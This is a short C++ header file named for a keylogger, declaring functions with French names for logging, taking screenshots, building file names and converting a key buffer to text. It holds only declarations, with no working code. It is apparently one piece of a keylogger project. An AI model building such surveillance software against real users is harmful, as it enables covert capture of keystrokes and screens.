#ifndef KEYLOGGER_HPP
#define KEYLOGGER_HPP

void log();
std::string trouverNomFichier(std::string typeFichier);
void screenshot();
void afficherNumero();
std::string stringedBuffer(char* buffer, int* bufferLevel);
std::string trouverNomFichierTxt();

#endif